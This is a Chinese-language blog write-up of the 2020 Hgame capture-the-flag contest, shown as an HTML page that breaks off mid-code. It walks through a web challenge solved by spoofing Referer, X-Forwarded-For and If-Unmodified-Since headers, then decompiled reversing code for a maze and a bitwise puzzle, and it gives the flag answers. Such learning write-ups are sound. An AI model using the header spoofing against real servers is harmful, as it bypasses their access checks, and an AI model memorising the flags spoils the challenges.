<!DOCTYPE html>
<html class="has-navbar-fixed-top">
<head>
    <meta charset="utf-8">
<title>hgame_wp - rr&#39;s blog</title>
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/outdated-browser/1.1.5/outdatedbrowser.min.css">








    <meta name="description" content="记录一下Hgame的部分题解和一些解题时的思路">
<meta property="og:type" content="article">
<meta property="og:title" content="hgame_wp">
<meta property="og:url" content="http://blog.rycbar.club/2020/01/25/hgame-wp/index.html">
<meta property="og:site_name" content="rr&#39;s blog">
<meta property="og:description" content="记录一下Hgame的部分题解和一些解题时的思路">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://s2.ax1x.com/2020/02/13/1qp5rT.png">
<meta property="og:image" content="https://s2.ax1x.com/2020/02/13/1qpqi9.png">
<meta property="article:published_time" content="2020-01-25T12:28:09.000Z">
<meta property="article:modified_time" content="2020-03-16T08:04:39.591Z">
<meta property="article:author" content="Aorui Zhang">
<meta property="article:tag" content="writeup">
<meta property="article:tag" content="ctf">
<meta property="article:tag" content="re">
<meta property="article:tag" content="hgame">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://s2.ax1x.com/2020/02/13/1qp5rT.png">





<link rel="icon" href="rust.png">


<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">
<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/bulma/0.6.2/css/bulma.min.css">


<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">
<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/justifiedGallery/3.6.5/css/justifiedGallery.min.css">


<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/github.min.css">


<link rel="stylesheet" href="/css/style.css">


<script defer src="//use.fontawesome.com/releases/v5.0.8/js/all.js"></script>


    
    
    
    
    
    
    
    
    
    
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-128484503-1"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-128484503-1');
</script>


    


<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="rr's blog" type="application/atom+xml">
</head>
<body>
    
<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
    <div class="container">
        <div class="navbar-brand">
            <a class="navbar-item navbar-logo" href="/">
                
                <img src="/images/logo.png" alt="" height="28">
                
            </a>
            <div class="navbar-burger">
                <span></span>
                <span></span>
                <span></span>
            </div>
        </div>
        
        <div class="navbar-menu navbar-start">
            
            <a class="navbar-item "
               href="/archives">Archives</a>
            
            <a class="navbar-item "
               href="/categories">Categories</a>
            
            <a class="navbar-item "
               href="/tags">Tags</a>
            
            <a class="navbar-item "
               href="/links">Links</a>
            
            <a class="navbar-item "
               href="/about">About</a>
            
            <a class="navbar-item "
               href="/atom.xml">RSS</a>
            
        </div>
        
        <div class="navbar-menu navbar-end">
            
            <a class="navbar-item search" title="Search" href="javascript:;">
                <i class="fas fa-search"></i>
            </a>
            
            
            <div class="navbar-item is-hoverable has-dropdown is-hidden-mobile is-hidden-tablet-only toc">
                <a class="navbar-item" title="Table of Contents">
                    <i class="fa fa-list"></i>
                </a>
                <div class="navbar-dropdown is-right">
                    
                    
                    
                    
                    <a class="navbar-item" href="#Week1">1&nbsp;&nbsp;<b>Week1</b></a>
                    
                    
                    
                    <a class="navbar-item" href="#Web">1.1&nbsp;&nbsp;Web</a>
                    
                    
                    
                    <a class="navbar-item" href="#接-头-霸-王">1.1.1&nbsp;&nbsp;接 头 霸 王</a>
                    
                    
                    
                    <a class="navbar-item" href="#RE">1.2&nbsp;&nbsp;RE</a>
                    
                    
                    
                    <a class="navbar-item" href="#maze">1.2.1&nbsp;&nbsp;maze</a>
                    
                    
                    
                    <a class="navbar-item" href="#bitwise-operation2">1.2.2&nbsp;&nbsp;bitwise_operation2</a>
                    
                    
                    
                    <a class="navbar-item" href="#advance">1.2.3&nbsp;&nbsp;advance</a>
                    
                    
                    
                    <a class="navbar-item" href="#cpp">1.2.4&nbsp;&nbsp;cpp</a>
                    
                    
                    
                    <a class="navbar-item" href="#PWN">1.3&nbsp;&nbsp;PWN</a>
                    
                    
                    
                    <a class="navbar-item" href="#Hard-AAAAA">1.3.1&nbsp;&nbsp;Hard_AAAAA</a>
                    
                    
                    
                    <a class="navbar-item" href="#Crypto">1.4&nbsp;&nbsp;Crypto</a>
                    
                    
                    
                    <a class="navbar-item" href="#InfantRSA">1.4.1&nbsp;&nbsp;InfantRSA</a>
                    
                    
                    
                    <a class="navbar-item" href="#misc">1.5&nbsp;&nbsp;misc</a>
                    
                    
                    
                    <a class="navbar-item" href="#欢迎参加HGame！">1.5.1&nbsp;&nbsp;欢迎参加HGame！</a>
                    
                    
                    
                    <a class="navbar-item" href="#壁纸">1.5.2&nbsp;&nbsp;壁纸</a>
                    
                    
                    
                    <a class="navbar-item" href="#签到题ProPlus">1.5.3&nbsp;&nbsp;签到题ProPlus</a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#Week2">2&nbsp;&nbsp;<b>Week2</b></a>
                    
                    
                    
                    <a class="navbar-item" href="#RE-1">2.1&nbsp;&nbsp;RE</a>
                    
                    
                    
                    <a class="navbar-item" href="#unpack">2.1.1&nbsp;&nbsp;unpack</a>
                    
                    
                    
                    <a class="navbar-item" href="#Classic-CrackMe">2.1.2&nbsp;&nbsp;Classic_CrackMe</a>
                    
                    
                    
                    <a class="navbar-item" href="#babyPy">2.1.3&nbsp;&nbsp;babyPy</a>
                    
                </div>
            </div>
            
            
            <a class="navbar-item" title="GitHub" target="_blank" rel="noopener" href="https://github.com/rycbar77">
                
                <i class="fab fa-github"></i>
                
            </a>
               
            
        </div>
    </div>
</nav>

    <section class="section">
    <div class="container">
    <article class="article content gallery" itemscope itemprop="blogPost">
    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
        
            hgame_wp
        
    </h1>
    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
        <span class="column is-narrow">
            
                <time datetime="2020-01-25T12:28:09.000Z" itemprop="datePublished">Jan 25 2020</time>
            
        </span>
        
        <span class="column is-narrow article-category">
            <i class="far fa-folder"></i>
            <a class="article-category-link" href="/categories/ctf/">ctf</a>
        </span>
        
        
        <span class="column is-narrow">
            
            
            37 minutes read (About 5477 words)
        </span>
        
    </div>
    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
    
        <html><head></head><body><p>记录一下Hgame的部分题解和一些解题时的思路</p>
<span id="more"></span>

<h2 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h2><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="接-头-霸-王"><a href="#接-头-霸-王" class="headerlink" title="接 头 霸 王"></a>接 头 霸 王</h4><p>打开题目，发现提示需要从vidar.club过来，所以burp抓包到repeater，添加响应头：</p>
<figure class="highlight http hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer:https://vidar.club</span><br></pre></td></tr></tbody></table></figure>

<p>然后提示需要从本地访问，添加响应头：</p>
<figure class="highlight http hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">X-Forwarded-For</span><span class="hljs-punctuation">: </span>127.0.0.1</span><br></pre></td></tr></tbody></table></figure>

<p>接着提示flag会在2077年更新，所以添加响应头：</p>
<figure class="highlight http hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">If-Unmodified-Since:Fri, 01 Jan 2077 00:00:00 GMT</span><br></pre></td></tr></tbody></table></figure>

<p>再发送请求得到flag</p>
<figure class="highlight plaintext hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame{W0w!Your_heads_@re_s0_many!}</span><br></pre></td></tr></tbody></table></figure>



<h3 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h3><h4 id="maze"><a href="#maze" class="headerlink" title="maze"></a>maze</h4><p>一看题目又是一道迷宫题，拖进IDA反编译</p>
<figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">v5 = (<span class="hljs-keyword">char</span> *)&amp;unk_6020C4;</span><br><span class="line">  <span class="hljs-keyword">while</span> ( (<span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span>)v4 &lt; <span class="hljs-built_in">SHIDWORD</span>(v4) )</span><br><span class="line">  {</span><br><span class="line">    v3 = s[(<span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span>)v4];</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">100</span> )</span><br><span class="line">    {</span><br><span class="line">      v5 += <span class="hljs-number">4</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( v3 &gt; <span class="hljs-number">100</span> )</span><br><span class="line">    {</span><br><span class="line">      <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">115</span> )</span><br><span class="line">      {</span><br><span class="line">        v5 += <span class="hljs-number">64</span>;</span><br><span class="line">      }</span><br><span class="line">      <span class="hljs-keyword">else</span></span><br><span class="line">      {</span><br><span class="line">        <span class="hljs-keyword">if</span> ( v3 != <span class="hljs-number">119</span> )</span><br><span class="line">        {</span><br><span class="line">LABEL_12:</span><br><span class="line">          <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Illegal input!"</span>);</span><br><span class="line">          <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);</span><br><span class="line">        }</span><br><span class="line">        v5 -= <span class="hljs-number">64</span>;</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">else</span></span><br><span class="line">    {</span><br><span class="line">      <span class="hljs-keyword">if</span> ( v3 != <span class="hljs-number">97</span> )</span><br><span class="line">        <span class="hljs-keyword">goto</span> LABEL_12;</span><br><span class="line">      v5 -= <span class="hljs-number">4</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v5 &lt; (<span class="hljs-keyword">char</span> *)&amp;unk_602080 || v5 &gt; (<span class="hljs-keyword">char</span> *)&amp;unk_60247C || *(_DWORD *)v5 &amp; <span class="hljs-number">1</span> )</span><br><span class="line">      <span class="hljs-keyword">goto</span> LABEL_22;</span><br><span class="line">    <span class="hljs-built_in">LODWORD</span>(v4) = v4 + <span class="hljs-number">1</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">if</span> ( v5 == (<span class="hljs-keyword">char</span> *)&amp;unk_60243C )</span><br><span class="line">  {</span><br><span class="line">    <span class="hljs-built_in">sprintf</span>(&amp;v7, <span class="hljs-string">"hgame{%s}"</span>, s, v4);</span><br><span class="line">    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"You win!"</span>);</span><br><span class="line">    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Flag is: "</span>);</span><br><span class="line">    <span class="hljs-built_in">puts</span>(&amp;v7);</span><br><span class="line">    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);</span><br><span class="line">  }</span><br><span class="line">LABEL_22:</span><br><span class="line">  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"You died"</span>);</span><br><span class="line">  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);</span><br></pre></td></tr></tbody></table></figure>

<p>贴出来的是反编译出来的主要部分，从这里可以确定v5的起始位置是unk_6020C4，上下左右分别是’w’,’s’,’a’,’d’，左右移动变化4字节，将所有的数据转化为DWORD类型，上下移动变化64字节，所以每行16个元素，范围是unk_602080到unk_60247C，正好是256个DWORD类型，组成16*16的方阵，其中所有和1按位与运算结果为0的是可以走的路线，即所有末尾为0的值是可以走的位置，最终的目标是走到unk_60243C这个点</p>
<p><img src="https://s2.ax1x.com/2020/02/13/1qp5rT.png" alt="maze"></p>
<p>即从（2，2）位置走到（15，16）位置</p>
<p>所以最后的flag为</p>
<figure class="highlight plaintext hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame{ssssddddddsssssddwwdddssssdssdd}</span><br></pre></td></tr></tbody></table></figure>

<h4 id="bitwise-operation2"><a href="#bitwise-operation2" class="headerlink" title="bitwise_operation2"></a>bitwise_operation2</h4><p>这题是让人头疼的位运算符，要把运算总共分为三个部分，要把整个过程都弄清楚，然后一部分一部分的逆向出来，任何一部分错了都会导致最终flag出错，还是挺考验细心和耐心的。</p>
<p>首先发现是linux可执行文件，拖进IDA反编译，并且对每一部分的作用进行一个分析</p>
<figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">//只贴出了有用的部分并且稍做了排版</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">void</span> __fastcall __noreturn <span class="hljs-title">main</span><span class="hljs-params">(__int64 a1, <span class="hljs-keyword">char</span> **a2, <span class="hljs-keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">char</span> v6; <span class="hljs-comment">// [rsp+10h] [rbp-60h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v7; <span class="hljs-comment">// [rsp+11h] [rbp-5Fh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v8; <span class="hljs-comment">// [rsp+12h] [rbp-5Eh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v9; <span class="hljs-comment">// [rsp+13h] [rbp-5Dh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v10; <span class="hljs-comment">// [rsp+14h] [rbp-5Ch]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v11; <span class="hljs-comment">// [rsp+15h] [rbp-5Bh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v12; <span class="hljs-comment">// [rsp+16h] [rbp-5Ah]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v13; <span class="hljs-comment">// [rsp+17h] [rbp-59h]</span></span><br><span class="line">  __int64 v14; <span class="hljs-comment">// [rsp+20h] [rbp-50h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v15; <span class="hljs-comment">// [rsp+28h] [rbp-48h]</span></span><br><span class="line">  __int64 v16; <span class="hljs-comment">// [rsp+30h] [rbp-40h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v17; <span class="hljs-comment">// [rsp+38h] [rbp-38h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> s; <span class="hljs-comment">// [rsp+40h] [rbp-30h]		//地址是连续的，flag中间的具体内容是v24和v25起始的两个16</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v19; <span class="hljs-comment">// [rsp+41h] [rbp-2Fh]		//字节</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v20; <span class="hljs-comment">// [rsp+42h] [rbp-2Eh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v21; <span class="hljs-comment">// [rsp+43h] [rbp-2Dh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v22; <span class="hljs-comment">// [rsp+44h] [rbp-2Ch]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v23; <span class="hljs-comment">// [rsp+45h] [rbp-2Bh]</span></span><br><span class="line">  __int16 v24; <span class="hljs-comment">// [rsp+46h] [rbp-2Ah]</span></span><br><span class="line">  __int16 v25; <span class="hljs-comment">// [rsp+56h] [rbp-1Ah]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v26; <span class="hljs-comment">// [rsp+66h] [rbp-Ah]</span></span><br><span class="line">  <span class="hljs-built_in">sub_4007E6</span>();<span class="hljs-comment">//只负责输出，没什么功能</span></span><br><span class="line">  v6 = <span class="hljs-number">76</span>;v7 = <span class="hljs-number">60</span>;v8 = <span class="hljs-number">214</span>;v9 = <span class="hljs-number">54</span>;v10 = <span class="hljs-number">80</span>;v11 = <span class="hljs-number">136</span>;v12 = <span class="hljs-number">32</span>;v13 = <span class="hljs-number">204</span>;</span><br><span class="line">  __isoc99_scanf(<span class="hljs-string">"%39s"</span>, &amp;s);</span><br><span class="line">  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strlen</span>(&amp;s) == <span class="hljs-number">39</span> &amp;&amp; s == <span class="hljs-string">'h'</span> &amp;&amp; v19 == <span class="hljs-string">'g'</span> &amp;&amp; v20 == <span class="hljs-string">'a'</span> &amp;&amp; v21 == <span class="hljs-string">'m'</span> &amp;&amp; v22 == <span class="hljs-string">'e'</span> &amp;&amp; v23 == <span class="hljs-string">'{'</span> &amp;&amp; v26 == <span class="hljs-string">'}'</span> )<span class="hljs-comment">// 共39位，hgame{***}格式</span></span><br><span class="line">  {</span><br><span class="line">    v14 = <span class="hljs-number">0LL</span>;</span><br><span class="line">    v15 = <span class="hljs-number">0</span>;</span><br><span class="line">    v16 = <span class="hljs-number">0LL</span>;</span><br><span class="line">    v17 = <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-comment">//这两条命令进行第一部分运算</span></span><br><span class="line">    <span class="hljs-built_in">sub_400616</span>((__int64)&amp;v14, (__int64)&amp;v24);   <span class="hljs-comment">// 传入地址，对flag中的部分进行操作</span></span><br><span class="line">    <span class="hljs-built_in">sub_400616</span>((__int64)&amp;v16, (__int64)&amp;v25);</span><br><span class="line">     </span><br><span class="line">    <span class="hljs-comment">//这里开始进行第二部分运算</span></span><br><span class="line">    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">7</span>; ++i )</span><br><span class="line">    {</span><br><span class="line">      *((_BYTE *)&amp;v14 + i) = ((*((_BYTE *)&amp;v14 + i) &amp; <span class="hljs-number">0xE0</span>) &gt;&gt; <span class="hljs-number">5</span>) | <span class="hljs-number">8</span> * *((_BYTE *)&amp;v14 + i);<span class="hljs-comment">// &amp;v14 + i前三位与后五位交换位置</span></span><br><span class="line">      *((_BYTE *)&amp;v14 + i) = *((_BYTE *)&amp;v14 + i) &amp; <span class="hljs-number">0x55</span> ^ ((*((_BYTE *)&amp;v16 + <span class="hljs-number">7</span> - i) &amp; <span class="hljs-number">0xAA</span>) &gt;&gt; <span class="hljs-number">1</span>) | *((_BYTE *)&amp;v14 + i) &amp; <span class="hljs-number">0xAA</span>;<span class="hljs-comment">// &amp;v14+i的奇数位不变，偶数位和&amp;v16+7-i的奇数位异或</span></span><br><span class="line">      *((_BYTE *)&amp;v16 + <span class="hljs-number">7</span> - i) = <span class="hljs-number">2</span> * (*((_BYTE *)&amp;v14 + i) &amp; <span class="hljs-number">0x55</span>) ^ *((_BYTE *)&amp;v16 + <span class="hljs-number">7</span> - i) &amp; <span class="hljs-number">0xAA</span> | *((_BYTE *)&amp;v16 + <span class="hljs-number">7</span> - i) &amp; <span class="hljs-number">0x55</span>;<span class="hljs-comment">// &amp;v16+7-i的偶数位不变，奇数位和&amp;v14+i的偶数位异或</span></span><br><span class="line">      *((_BYTE *)&amp;v14 + i) = *((_BYTE *)&amp;v14 + i) &amp; <span class="hljs-number">0x55</span> ^ ((*((_BYTE *)&amp;v16 + <span class="hljs-number">7</span> - i) &amp; <span class="hljs-number">0xAA</span>) &gt;&gt; <span class="hljs-number">1</span>) | *((_BYTE *)&amp;v14 + i) &amp; <span class="hljs-number">0xAA</span>;<span class="hljs-comment">// &amp;v14+i奇数位不变，偶数位和&amp;v16+7-i的奇数位异或</span></span><br><span class="line">    }                                           </span><br><span class="line">    </span><br><span class="line">    <span class="hljs-comment">//这里进行第三部分运算</span></span><br><span class="line">    <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt;= <span class="hljs-number">7</span>; ++j )</span><br><span class="line">    {</span><br><span class="line">      *((_BYTE *)&amp;v14 + j) ^= *(&amp;v6 + j);       <span class="hljs-comment">// v6 = 76;</span></span><br><span class="line">                                                <span class="hljs-comment">//   v7 = 60;</span></span><br><span class="line">                                                <span class="hljs-comment">//   v8 = 214;</span></span><br><span class="line">                                                <span class="hljs-comment">//   v9 = 54;</span></span><br><span class="line">                                                <span class="hljs-comment">//   v10 = 80;</span></span><br><span class="line">                                                <span class="hljs-comment">//   v11 = 136;</span></span><br><span class="line">                                                <span class="hljs-comment">//   v12 = 32;</span></span><br><span class="line">                                                <span class="hljs-comment">//   v13 = 204;</span></span><br><span class="line">      <span class="hljs-keyword">if</span> ( *((_BYTE *)&amp;v14 + j) != byte_602050[j] )<span class="hljs-comment">// e4sy_Re_</span></span><br><span class="line">      {</span><br><span class="line">        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"sry, wrong flag"</span>);</span><br><span class="line">        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">for</span> ( k = <span class="hljs-number">0</span>; k &lt;= <span class="hljs-number">7</span>; ++k )</span><br><span class="line">    {</span><br><span class="line">      *((_BYTE *)&amp;v16 + k) ^= *((_BYTE *)&amp;v14 + k) ^ *(&amp;v6 + k);	<span class="hljs-comment">// v6 = 76;</span></span><br><span class="line">                            	<span class="hljs-comment">//这里异或之后又变成了V14最初始的值   	  //   v7 = 60;</span></span><br><span class="line">                                                					<span class="hljs-comment">//   v8 = 214;</span></span><br><span class="line">                                                					<span class="hljs-comment">//   v9 = 54;</span></span><br><span class="line">                                                					<span class="hljs-comment">//   v10 = 80;</span></span><br><span class="line">                                                					<span class="hljs-comment">//   v11 = 136;</span></span><br><span class="line">                                                					<span class="hljs-comment">//   v12 = 32;</span></span><br><span class="line">                                                					<span class="hljs-comment">//   v13 = 204;</span></span><br><span class="line">      <span class="hljs-keyword">if</span> ( *((_BYTE *)&amp;v16 + k) != byte_602060[k] )<span class="hljs-comment">// Easylif3</span></span><br><span class="line">      {</span><br><span class="line">        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Just one last step"</span>);</span><br><span class="line">        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Congratulations! You are already familiar with bitwise operation."</span>);</span><br><span class="line">    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Flag is your input."</span>);</span><br><span class="line">    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Illegal input!"</span>);</span><br><span class="line">  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">//sub_400616() 第一部分运算所用到的函数</span></span><br><span class="line"><span class="hljs-function">_BYTE *__fastcall <span class="hljs-title">sub_400616</span><span class="hljs-params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  _BYTE *result; <span class="hljs-comment">// rax</span></span><br><span class="line">  <span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">7</span>; ++i )</span><br><span class="line">  {</span><br><span class="line">    <span class="hljs-keyword">if</span> ( *(_BYTE *)(<span class="hljs-number">2</span> * i + a2) &lt;= <span class="hljs-number">96</span> || *(_BYTE *)(<span class="hljs-number">2</span> * i + a2) &gt; <span class="hljs-number">102</span> )</span><br><span class="line">    {</span><br><span class="line">      <span class="hljs-keyword">if</span> ( *(_BYTE *)(<span class="hljs-number">2</span> * i + a2) &lt;= <span class="hljs-number">47</span> || *(_BYTE *)(<span class="hljs-number">2</span> * i + a2) &gt; <span class="hljs-number">57</span> )</span><br><span class="line">      {</span><br><span class="line">LABEL_17:</span><br><span class="line">        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Illegal input!"</span>);</span><br><span class="line">        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);</span><br><span class="line">      }</span><br><span class="line">      *(_BYTE *)(i + a1) = *(_BYTE *)(<span class="hljs-number">2</span> * i + a2) - <span class="hljs-number">48</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">else</span></span><br><span class="line">    {</span><br><span class="line">      *(_BYTE *)(i + a1) = *(_BYTE *)(<span class="hljs-number">2</span> * i + a2) - <span class="hljs-number">87</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">if</span> ( *(_BYTE *)(<span class="hljs-number">2</span> * i + <span class="hljs-number">1LL</span> + a2) &lt;= <span class="hljs-number">96</span> || *(_BYTE *)(<span class="hljs-number">2</span> * i + <span class="hljs-number">1LL</span> + a2) &gt; <span class="hljs-number">102</span> )</span><br><span class="line">    {</span><br><span class="line">      <span class="hljs-keyword">if</span> ( *(_BYTE *)(<span class="hljs-number">2</span> * i + <span class="hljs-number">1LL</span> + a2) &lt;= <span class="hljs-number">47</span> || *(_BYTE *)(<span class="hljs-number">2</span> * i + <span class="hljs-number">1LL</span> + a2) &gt; <span class="hljs-number">57</span> )</span><br><span class="line">        <span class="hljs-keyword">goto</span> LABEL_17;</span><br><span class="line">      result = (_BYTE *)(i + a1);</span><br><span class="line">      *result = <span class="hljs-number">16</span> * *result + *(_BYTE *)(<span class="hljs-number">2</span> * i + <span class="hljs-number">1LL</span> + a2) - <span class="hljs-number">48</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">else</span></span><br><span class="line">    {</span><br><span class="line">      result = (_BYTE *)(i + a1);</span><br><span 